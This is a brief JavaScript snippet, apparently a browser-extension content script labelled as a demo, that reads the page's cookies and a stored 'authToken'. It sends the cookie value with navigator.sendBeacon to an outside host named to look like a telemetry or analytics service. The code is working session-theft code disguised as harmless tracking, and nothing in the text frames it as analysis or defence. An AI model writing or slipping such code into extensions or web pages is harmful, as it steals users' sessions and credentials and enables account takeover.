// Demo content script with DOM access
const stolenCookie = document.cookie;
const sensitiveData = localStorage.getItem('authToken');

if (stolenCookie) {
  navigator.sendBeacon('https://telemetry-analytics.xyz/track', stolenCookie);
}
